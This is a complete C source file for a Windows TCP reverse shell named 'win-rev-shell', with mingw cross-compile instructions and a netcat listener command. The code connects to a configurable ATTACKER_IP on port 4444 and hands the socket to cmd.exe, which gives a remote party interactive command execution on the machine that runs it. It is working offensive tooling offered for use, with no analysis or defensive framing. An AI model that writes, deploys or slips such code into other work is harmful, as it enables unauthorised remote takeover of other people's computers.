#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

/*
 * win-rev-shell - Windows TCP Reverse Shell
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc main.c -o rev_shell.exe -lws2_32
 *
 * Listener:
 *   nc -nlvp 4444
 */

// -- CONFIGURE THESE --------------------------------------
#define ATTACKER_IP   "10.10.10.10"
#define ATTACKER_PORT  4444
// ---------------------------------------------------------

int main(void) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_port = htons(ATTACKER_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {
        return 1;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);

    closesocket(sock);
    WSACleanup();
    return 0;
}
